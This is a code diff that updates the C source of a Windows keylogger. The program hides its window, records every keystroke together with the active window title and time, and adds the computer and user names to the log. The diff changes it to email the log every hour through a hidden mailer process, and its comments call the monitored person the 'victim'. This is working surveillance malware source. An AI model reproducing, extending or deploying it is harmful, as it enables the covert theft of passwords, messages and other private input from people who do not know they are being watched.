@@ -5,14 +5,15 @@
 #include <windows.h>
 #include <process.h>
 
-// GLOBALS
+// GLOBALS //
 #define BUF_SIZE 256 // general purpose for buffers
-int keystroke_count; // rough tracking for size of logfile
+#define LOG_TIMER 3600 // time limit until send email (3600s == 1 hour)
 
 // FUNCTION DECLARATIONS //
 char* GetTime();
 void HideWindow();
 void InitLogfile(char* filename);
+int GetLogfileLength(char* filename);
 void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_logfile);
 void ExecuteMailer();
 void KeystrokeHandler(short key, FILE* logfile);
@@ -22,16 +23,19 @@ int main(){
     // avoid visible detection of executable window
     HideWindow();
 
+    // initialize timers
+    clock_t email_timer;               // tracks against LOG_TIMER
+    clock_t keystroke_timer = clock(); // resets at each keystroke
+
     // initialize the current window
     char window[BUF_SIZE];
     char new_window[BUF_SIZE];
     HWND foreground = GetForegroundWindow();
     GetWindowText(foreground, window, BUF_SIZE);
 
-    // initialize logfile and keystrokes
+    // initialize logfile
     char filename[BUF_SIZE];
     InitLogfile(filename);
-    keystroke_count = 0;
 
     // active program process
     while(1){
@@ -44,23 +48,30 @@ int main(){
             // check for key press
             // where -32767 means key is pressed
             if(GetAsyncKeyState(key) == -32767){
+                keystroke_timer = clock();
 
                 // open keylog file then handle keystroke
-                FILE* logfile;
-                logfile = fopen(filename, "a");
+                FILE* logfile = fopen(filename, "a");
                 GetCurrentWindow(window, new_window, logfile, 0);
                 KeystrokeHandler(key, logfile);
-                keystroke_count++;
                 fclose(logfile);
-
-                // once logfile large enough, execute mailer
-                if(keystroke_count >= 250){
-                    //Execute mailer.py
-                    ExecuteMailer();
-                    keystroke_count = 0;
-                    InitLogfile(filename);
-                }
             }
+        }
+
+        email_timer = (clock() - keystroke_timer) / CLOCKS_PER_SEC;
+
+        // check if its time to send the email
+        // no keystrokes lets email_timer time out
+        if(email_timer > LOG_TIMER){
+            
+            // don't send empty files (5 lines is length of header)
+            if(GetLogfileLength(filename) > 5){
+                ExecuteMailer();        // email
+                InitLogfile(filename);  // clear logfile
+            }
+
+            // reset timer
+            keystroke_timer = clock();
         }
     }
     return 0;
@@ -84,19 +95,39 @@ void HideWindow(){
 
 // initialize logfile filename and header
 void InitLogfile(char* filename){
-    // develop filename based on victim's current user
-    char username[BUF_SIZE+1];
     DWORD len = BUF_SIZE+1;
-    GetUserName(username, &len);
-    sprintf(filename, "%s_log.txt", username);
+    
+    // get current computer's name
+    char computername[BUF_SIZE+1];
+    GetComputerName(computername, &len);
 
-    // initialize logfile and window handle, then print to file
-    FILE* logfile = fopen(filename, "w");
+    // get current user's name
+    char username[BUF_SIZE+1];
+    GetUserName(username, &len);
+
+    // get foreground window
     char window[BUF_SIZE];
     HWND foreground = GetForegroundWindow();
     GetWindowText(foreground, window, BUF_SIZE);
+
+    // open clean logfile and print out header
+    sprintf(filename, "%s_log.txt", username);
+    FILE* logfile = fopen(filename, "w");
+    fprintf(logfile, "COMPUTER: %s\nUSERNAME: %s\n", computername, username);
     GetCurrentWindow(window, window, logfile, 1);
     fclose(logfile);
+}
+
+// gets the length of the logfile
+int GetLogfileLength(char* filename){
+    int lines = 0;
+    FILE* logfile = fopen(filename, "r");
+    while(!feof(logfile)){
+        if(fgetc(logfile) == '\n'){ 
+            lines++; 
+        }
+    }
+    return lines;
 }
 
 // get the current working window of the user
@@ -106,8 +137,7 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_lo
     
     // display current window and time for clean logfile instance
     if(init_logfile == 1){
-        fputs("BEGIN LOGGING...", logfile);
-        fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, GetTime());
+        fprintf(logfile, "WINDOW: %s\nTIME: %s", new_window, GetTime());
         fflush(logfile);
         return;
     }
@@ -118,8 +148,8 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_lo
 
         // if changed/updated, display current window and time
         if(!strcmp(window, new_window) && strcmp(window, "")){
-            keystroke_count+=100; // account for avg length of header
-            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %s", new_window, GetTime());
+            //keystroke_count+=100; // account for avg length of header
+            fprintf(logfile, "\n\nWINDOW: %s\nTIME: %sKEYSTROKES: ", new_window, GetTime());
             fflush(logfile);
         }
     }
@@ -127,15 +157,15 @@ void GetCurrentWindow(char* window, char* new_window, FILE* logfile, int init_lo
 
 // executes mailer module to send logfile
 void ExecuteMailer(){
+    PROCESS_INFORMATION pi;
     STARTUPINFO si = { sizeof(STARTUPINFO) };
     si.cb = sizeof(si);
     si.dwFlags = STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE; // hide new executable window
-    PROCESS_INFORMATION pi;
     
     // win32 version of fork() and exec()
     CreateProcess(
-        "C:\\Users\\Logan\\Documents\\Programming\\Simple-Keylogger\\mailer.exe",
+        "", //path of mailer executable
         NULL, NULL, NULL,
         FALSE,
         CREATE_NO_WINDOW,
@@ -144,8 +174,9 @@ void ExecuteMailer(){
     );
 
     // wait for child process to complete to prevent emailing emptied logfile
-    WaitForSingleObject(&pi, INFINITE);
+    WaitForSingleObject(&pi.hProcess, INFINITE);
     CloseHandle(&pi);
+    Sleep(1000);
 }
 // writes to file the interpretation of keystroke
 void KeystrokeHandler(short key, FILE* logfile){
@@ -177,6 +208,10 @@ void KeystrokeHandler(short key, FILE* logfile){
             case VK_OEM_5: fputs("[\\|]", logfile); break;
             case VK_OEM_6: fputs("[ ]} ]", logfile); break;
             case VK_OEM_7: fputs("['\"]", logfile); break;
+            case VK_LEFT: fputs("[LEFT]", logfile); break;
+            case VK_UP: fputs("[UP]", logfile); break;
+            case VK_RIGHT: fputs("[RIGHT]", logfile); break;
+            case VK_DOWN: fputs("[DOWN]", logfile); break;
             case 187: fputc('+', logfile); break;
             case 188: fputc(',', logfile); break;
             case 189: fputc('-', logfile); break;
